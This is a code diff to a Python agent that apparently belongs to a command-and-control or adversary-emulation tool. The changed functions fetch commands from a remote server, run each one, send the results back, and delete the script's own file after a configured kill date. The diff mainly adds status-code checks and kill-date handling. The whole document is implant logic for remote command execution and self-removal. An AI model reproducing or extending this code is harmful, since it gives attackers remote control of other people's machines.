@@ -25,7 +25,7 @@ def config_file():
 
     # When operator sets a kill date, kill_date_string will not be 'None'
     # None was converted to a string
-    if kill_date_string != 'None':
+    if kill_date_string != 'None' and isinstance(kill_date_string, datetime.datetime):
 
         config.read('config.ini')
         if 'kill_date' in config['AGENT']:
@@ -106,15 +106,17 @@ def get_techniques():
         return
     # print('Response code: ' + str(req.status))
     # print('Response: ' + response)
-    response = response.split(',')
-    result = []
+    if req.status == 200:
+        response = response.split(',')
+        result = []
 
-    for res in response:
-        if res is not '':
-            result.append(res)
-    # print(response)
-    # print(result)
-    return result
+        for res in response:
+            if res is not '':
+                result.append(res)
+        # print(response)
+        # print(result)
+        return result
+    return
 
 
 def download_and_run_commands():
@@ -124,13 +126,11 @@ def download_and_run_commands():
 
     req = http.request('GET', url, headers=headers)
     response = str(req.data.decode('utf-8'))
-    response_code = req.status
-    if ';' not in response:
-        return
+
     # print('Response code: ' + str(req.status))
     # print('Response: ' + response)
 
-    if response_code == 200:
+    if req.status == 200:
         # Separates technique's commands into a list separated by ++
         agent_commands = response.split(';')
 
@@ -144,7 +144,8 @@ def download_and_run_commands():
 
             results.append(execute_command(command))
 
-    return results
+        return results
+    return
 
 
 def send_output():
@@ -179,14 +180,18 @@ def send_output():
 
 
 def confirm_kill():
-    # check = configparser.ConfigParser()
-    # check.read('config.ini')
-    #
-    # kill_date = check['AGENT']['kill_date']
-    #
+    global kill_date_string
+    if kill_date_string == '':
+        check = configparser.ConfigParser()
+        check.read('config.ini')
+
+        if 'kill_date' in check['AGENT']:
+            kill_date_string = check['AGENT']['kill_date']
+
+    if kill_date_string == '':
+        return
+
     now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    # if now > kill_date_string:
-    # if now > kill_date:
     if now > kill_date_string:
         path = Path(__file__)
         os.remove(path)
@@ -241,4 +246,4 @@ if __name__ == '__main__':
     # print(results)
     register()
     send_output()
-    # config_file()
+    config_file()
